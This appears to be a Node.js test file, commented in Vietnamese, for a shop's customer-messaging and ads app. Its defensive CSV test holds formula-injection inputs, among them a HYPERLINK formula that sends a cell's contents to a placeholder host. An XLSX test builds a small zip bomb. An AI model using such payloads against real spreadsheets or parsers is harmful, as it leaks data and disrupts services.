// Các lỗi nhỏ 01/10: T12 thẻ "Đã mua hàng" khớp SĐT landing, T9 CSV khách chặn công thức, T13 XLSX
// giới hạn sau giải nén, T14 ngày trong tệp khách theo giờ VN, T7 sửa SĐT khách, TB-1 số ngày kéo lại
// quảng cáo, T-6 timeout Graph, TB-4 beacon QR /open, T-8 dọn greetedAt.
import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import AdmZip from 'adm-zip';
import { tempDir } from './helpers/temp-dir.mjs';

const directory = tempDir('fix-store-misc-');
process.env.QR_SCANS_PATH = path.join(directory, 'qr-scans.json');
process.env.CUSTOMER_FILE_PATH = path.join(directory, 'customer-file.json');
process.env.CUSTOMER_EDITS_PATH = path.join(directory, 'customer-edits.json');
process.env.LANDING_ORDERS_PATH = path.join(directory, 'landing-orders.json');

const { backfillPurchaseLabels } = await import('../app/purchase-labels.mjs');
const { customersToCsv, customersToAudienceCsv } = await import('../app/customers.mjs');
const { parseXlsx, XLSX_MAX_ENTRY_BYTES } = await import('../app/xlsx-import.mjs');
const { orderedAtFromLabel, customerPhoneKey } = await import('../app/customer-file.mjs');
const { updateCustomerProfile } = await import('../app/customer-edits.mjs');
const { planBackgroundSync, graphList } = await import('../app/meta-ads.mjs');
const { registerQrCode, recordQrScan, recordQrOpen } = await import('../app/qr-scans.mjs');
const { createQrGreeter } = await import('../app/qr-greeting.mjs');

const HOUR = 60 * 60 * 1000;
const DAY = 24 * HOUR;

test('T12: SĐT trong tin khách không nuốt số nhà (cùng dòng hay xuống dòng); đơn landing bỏ dở/hủy/hoàn không gắn thẻ', () => {
  const now = Date.UTC(2026, 9, 1, 8);
  const order = (id, phone, extra = {}) => ({ id, phone, createdAt: now - 3 * HOUR, status: 'Mới', ...extra });
  const store = { conversations: [1, 2, 3, 4, 5, 6].map(index => ({ id: `p:${index}`, pageId: 'p', psid: String(index), labels: [] })), messages: {
    'p:1': [{ direction: 'incoming', text: 'sdt 0912345678 5 Lê Lợi', createdAt: now - 4 * HOUR }],
    'p:2': [{ direction: 'incoming', text: '0912 345 670\n12 Nguyễn Huệ', createdAt: now - 4 * HOUR }],
    'p:3': [{ direction: 'incoming', text: 'Gửi về 0912.345.671, 3 Pasteur', createdAt: now - 4 * HOUR }],
    'p:4': [{ direction: 'incoming', text: '0933111222', createdAt: now - 4 * HOUR }],
    'p:5': [{ direction: 'incoming', text: '0933111333', createdAt: now - 4 * HOUR }],
    'p:6': [{ direction: 'incoming', text: '0933111444', createdAt: now - 4 * HOUR }]
  } };
  const landingOrders = [
    order('L1', '0912345678'),
    order('L2', '0912345670'),
    order('L3', '0912345671'),
    order('L4', '0933111222', { landing: { incomplete: true }, status: 'Chưa hoàn tất' }),
    order('L5', '0933111333', { posStatus: { code: 5, name: 'Đã hoàn' } }),
    order('L6', '0933111444', { landing: { incomplete: true }, processingStatus: 'confirmed', status: 'Đã xác nhận' })
  ];
  const changes = backfillPurchaseLabels(store, { orderLabels: ['customer'], landingOrders, now });
  assert.deepEqual(changes.map(change => change.conversation.id).sort(), ['p:1', 'p:2', 'p:3', 'p:6']);
  assert.deepEqual(store.conversations[3].labels, [], 'form bỏ dở chưa là đơn');
  assert.deepEqual(store.conversations[4].labels, [], 'đơn hoàn (POS 5) không gắn');
  // Đơn trong hội thoại đã hoàn/hủy trên POS cũng không gắn bù.
  const inbox = { conversations: [{ id: 'q:1', pageId: 'q', psid: '1', labels: [], customerOrders: [{ id: 'c', createdAt: now - 3 * HOUR, status: 'Mới', posStatus: { code: 6 } }] }], messages: {} };
  assert.deepEqual(backfillPurchaseLabels(inbox, { orderLabels: ['customer'], now }), []);
});

test('T9: CSV khách hàng thêm \' trước ô bắt đầu bằng = + - @; tệp đối tượng Meta giữ nguyên tên', () => {
  const customer = { name: '=HYPERLINK("http://x/?"&B2,"bấm")', psid: '1', labels: [], sources: [], address: '@SUM(A1)', adTitle: '+cmd', phone: '0912345678', orderCount: 2, orderTotal: 300000 };
  const csv = customersToCsv([customer]);
  const row = csv.split('\r\n')[1];
  assert.ok(row.startsWith(`"'=HYPERLINK(""http://x/?""&B2,""bấm"")"`), row);
  assert.match(row, /,'@SUM\(A1\),/);
  assert.match(row, /,'\+cmd$/);
  assert.match(row, /,0912345678,/, 'SĐT không bị thêm dấu');
  assert.match(row, /,2,300000,/, 'số giữ nguyên');
  const audience = customersToAudienceCsv([{ ...customer, name: '=Lan' }]);
  // R13 (T9) — sửa khẳng định cũ: trước đây test đòi audience.csv giữ nguyên "=Lan" (ô mở công thức khi mở bằng
  // Excel = đúng hành vi lỗi). Nay: vẫn KHÔNG thêm dấu ' (Meta khớp fn theo chữ), nhưng bỏ ký tự mở công thức ở đầu tên.
  assert.match(audience, /84912345678,Lan,VN/, 'audience.csv không thêm \' và không để ô bắt đầu bằng =');
  assert.doesNotMatch(audience, /,[=+\-@']/, 'không ô nào của audience.csv mở đầu bằng ký tự công thức hay dấu \'');
});

test('T13: XLSX có phần giải nén vượt trần bị từ chối trước khi giải nén', () => {
  const zip = new AdmZip();
  zip.addFile('xl/workbook.xml', Buffer.from('<workbook><sheets><sheet name="S" r:id="rId1"/></sheets></workbook>'));
  zip.addFile('xl/_rels/workbook.xml.rels', Buffer.from('<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>'));
  zip.addFile('xl/worksheets/sheet1.xml', Buffer.alloc(XLSX_MAX_ENTRY_BYTES + 1024, 0x20));
  const buffer = zip.toBuffer();
  assert.ok(buffer.length < 2 * 1024 * 1024, 'tệp nén nhỏ (zip bomb)');
  assert.throws(() => parseXlsx(buffer), /quá lớn sau khi giải nén/);
  // Tệp bình thường vẫn đọc được.
  const ok = new AdmZip();
  ok.addFile('xl/workbook.xml', Buffer.from('<workbook><sheets><sheet name="S" r:id="rId1"/></sheets></workbook>'));
  ok.addFile('xl/_rels/workbook.xml.rels', Buffer.from('<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>'));
  ok.addFile('xl/worksheets/sheet1.xml', Buffer.from('<worksheet><sheetData><row><c r="A1" t="inlineStr"><is><t>SĐT</t></is></c></row><row><c r="A2" t="inlineStr"><is><t>0912345678</t></is></c></row></sheetData></worksheet>'));
  assert.deepEqual(parseXlsx(ok.toBuffer()).rows, [['0912345678']]);
});

test('T14: cột Ngày của tệp khách đọc theo giờ VN dù máy chủ chạy UTC; SĐT mất số 0 đầu gộp đúng khách', () => {
  const vn = (month, day, hour, minute) => Date.UTC(2026, month, day, hour, minute) - 7 * HOUR;
  assert.equal(orderedAtFromLabel('16/09 07:52', vn(8, 16, 15, 0)), vn(8, 16, 7, 52));
  assert.equal(new Date(orderedAtFromLabel('16/09 07:52', vn(8, 16, 15, 0))).toISOString(), '2026-09-16T00:52:00.000Z');
  assert.equal(orderedAtFromLabel('31/12/2025 23:30', vn(8, 16, 15, 0)), Date.UTC(2025, 11, 31, 16, 30));
  assert.equal(customerPhoneKey('912345678'), '0912345678');
});

test('T7: sửa SĐT khách: +84 → 0, số lạ lưu kèm cảnh báo, ô trống gỡ phần đã sửa', async () => {
  const saved = await updateCustomerProfile('k1', { phone: '+84 912 345 678' }, 1000);
  assert.equal(saved.phone, '0912345678');
  assert.equal(saved.warnings, undefined);
  const odd = await updateCustomerProfile('k1', { phone: '0283 456 789' }, 2000);
  assert.equal(odd.phone, '0283456789');
  assert.match(odd.warnings[0], /không giống số di động/);
  await assert.rejects(updateCustomerProfile('k1', { phone: '0912' }), /không hợp lệ/);
  const cleared = await updateCustomerProfile('k1', { phone: '' }, 3000);
  assert.equal(cleared.phone, undefined);
});

test('TB-1: vòng nền quảng cáo: chưa phủ 90 ngày thì kéo bù 90; máy chủ ngưng thì kéo từ ngày cuối đã phủ − 3 (tối đa 120)', () => {
  const now = Date.UTC(2026, 9, 1);
  const [empty] = planBackgroundSync({}, ['act_1'], now);
  assert.deepEqual([empty.since, empty.until, empty.kind], ['2026-07-04', '2026-10-01', 'backfill']);
  const fresh = { coverage: { act_1: { since: '2026-06-01', until: '2026-10-01', deepAt: now - HOUR } } };
  assert.equal(planBackgroundSync(fresh, ['act_1'], now)[0].since, '2026-09-29');
  const stale = { coverage: { act_1: { since: '2026-06-01', until: '2026-09-16', deepAt: now - 15 * DAY } } };
  assert.equal(planBackgroundSync(stale, ['act_1'], now)[0].since, '2026-09-04', 'ngưng 15 ngày: kéo đủ khoảng trống');
  const ancient = { coverage: { act_1: { since: '2025-01-01', until: '2025-06-01', deepAt: 1 } } };
  assert.equal(planBackgroundSync(ancient, ['act_1'], now)[0].since, '2026-06-04', 'không quá 120 ngày');
});

test('T-6: lời gọi Graph có AbortSignal (timeout), hết giờ báo lỗi tiếng Việt', async () => {
  let signal = null;
  const fetchImpl = async (url, options) => {
    signal = options.signal;
    throw Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' });
  };
  await assert.rejects(graphList('act_1/campaigns', {}, { config: { accessToken: 't', appSecret: '' }, fetchImpl }), /quá 30 giây không trả lời/);
  assert.ok(signal instanceof AbortSignal);
});

test('TB-4: beacon /open chỉ đếm khi có lượt trang đệm cùng mã trong 30 phút, mỗi lượt trang tối đa một lần bấm; cùng dấu vết khử trùng', async () => {
  await registerQrCode('the-thu');
  const t0 = Date.UTC(2026, 9, 1, 3);
  assert.equal(await recordQrOpen('the-thu', { at: t0 }), null, 'chưa có lượt quét trang đệm: không đếm');
  await recordQrScan('the-thu', { at: t0 + 1000, mode: 'redirect', userAgent: 'Mozilla/5.0 (iPhone)' });
  assert.equal(await recordQrOpen('the-thu', { at: t0 + 2000 }), null, 'lượt chuyển hướng thẳng không có nút để bấm');
  await recordQrScan('the-thu', { at: t0 + 3000, mode: 'page', userAgent: 'Mozilla/5.0 (iPhone)' });
  const first = await recordQrOpen('the-thu', { at: t0 + 4000, visitor: 'v1' });
  assert.equal(first.opens, 1);
  assert.equal(await recordQrOpen('the-thu', { at: t0 + 5000 }), null, 'gửi beacon lần hai cho cùng một lượt trang: không đếm');
  assert.equal((await recordQrOpen('the-thu', { at: t0 + 5500, target: 'zalo' })).zaloOpens, 1, 'Zalo đếm riêng');
  await recordQrScan('the-thu', { at: t0 + 6000, mode: 'page', userAgent: 'Mozilla/5.0 (iPhone)' });
  assert.equal(await recordQrOpen('the-thu', { at: t0 + 7000, visitor: 'v1' }), null, 'cùng máy bấm lại trong 30 phút: một lượt');
  assert.equal((await recordQrOpen('the-thu', { at: t0 + 8000, visitor: 'v2' })).opens, 2);
  await recordQrScan('the-thu', { at: t0 + 9000, mode: 'page', userAgent: 'Mozilla/5.0 (iPhone)' });
  assert.equal(await recordQrOpen('the-thu', { at: t0 + 9000 + 31 * 60 * 1000 }), null, 'quá 30 phút sau lượt trang: không đếm');
});

test('T-8: bộ chào QR dọn mục greetedAt quá thời gian chờ', () => {
  let clock = 1_000_000;
  const greeter = createQrGreeter({ offerMessage: async () => '', send: async () => {}, cooldownMs: 1000, now: () => clock, known: () => true, log: () => {}, logError: () => {} });
  const conversation = { id: 'p:1', psid: '1', pageId: 'p' };
  greeter.schedule([{ conversation, referral: { ref: 'tmdt-01', source: 'SHORTLINK', type: 'BOTCAKE_OPTIN' } }]);
  assert.equal(greeter.greetedAt.size, 1);
  clock += 500;
  greeter.schedule([]);
  assert.equal(greeter.greetedAt.size, 1, 'còn trong thời gian chờ: giữ');
  clock += 1000;
  greeter.schedule([]);
  assert.equal(greeter.greetedAt.size, 0, 'quá thời gian chờ: dọn');
});
